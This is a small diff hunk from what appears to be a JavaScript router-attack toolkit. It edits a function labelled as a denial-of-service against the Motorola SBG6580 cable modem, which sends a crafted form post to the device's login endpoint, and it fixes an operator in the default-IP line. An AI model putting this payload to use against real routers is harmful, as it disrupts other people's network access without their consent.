@@ -1425,7 +1425,7 @@ function motpas(){
 // Motorola SBG6580 Cable Modem & Wireless-N Router Denial of Service
 function SBG6580_motorola(ip)
 {
-	ip = "192.168.0.1" | ip;
+	ip = "192.168.0.1" || ip;
     form = '<input type="hidden" name="this_was" value="too_easy"/>\
 			</form>';
 	post('http://' + ip + '/goform/login', form);
